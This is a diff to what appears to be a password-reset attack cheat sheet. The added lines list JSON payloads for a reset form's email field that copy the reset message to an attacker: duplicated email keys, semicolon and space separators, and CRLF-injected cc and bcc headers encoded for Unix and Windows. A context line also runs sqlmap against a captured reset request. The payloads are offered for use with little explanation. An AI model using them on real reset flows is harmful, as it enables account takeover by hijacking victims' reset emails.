@@ -18,7 +18,44 @@ sqlpmap -r pass_reset.txt -p email
 #### JSON table:
 - {"email":["victim@xyz.tld","hacker@xyz.tld"]}
 
-#### two JSON emails
+#### two JSON emails(comma separator)
 ````
 {"email":"victim@mail.com","email":"attacker@mail.com"}
 ````
+#### Exploiting $to parameter in SMTP header injection
+- using semicolon separator
+````
+{"email":"Victim@gmail.com;Attacker@gmail.com","email":"Victim@gmail.com"}
+{"email":"Victim@gmail.com","email":"Victim@gmail.com;Attacker@gmail.com"}
+````
+- using SPACE separator
+````
+{"email":"Victim@gmail.com%20Attacker@gmail.com","email":"Victim@gmail.com"}
+{"email":"Victim@gmail.com","email":"Victim@gmail.com%20Attacker@gmail.com"}
+````
+#### CRLF Injection
+- In Unix system(\n url encoded)
+
+using carbon copy
+````
+{"email":"Victim@mail.com%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
+{"email":"Victim@mail.com","email":"Victim@mail.com%0Acc:Attacker@mail.com"}
+````
+using blind carbon copy
+ ````
+ {"email": "Victim@mail.com%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
+ {"email":"Victim@mail.com","email":"Victim@mail.com%0Abcc:Attacker@mail.com"}
+ ````
+- In Windows system(\r\n)
+ 
+ using carbon copy
+ ````
+ {"email":"Victim@mail.com%0D%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
+ {"email":"Victim@mail.com","email":"Victim@mail.com%0D%0Acc:Attacker@mail.com"}
+ ````
+ using blind carbon copy 
+ ````
+ {"email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
+ {"email":"Victim@mail.com","email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com"}
+ ````
+
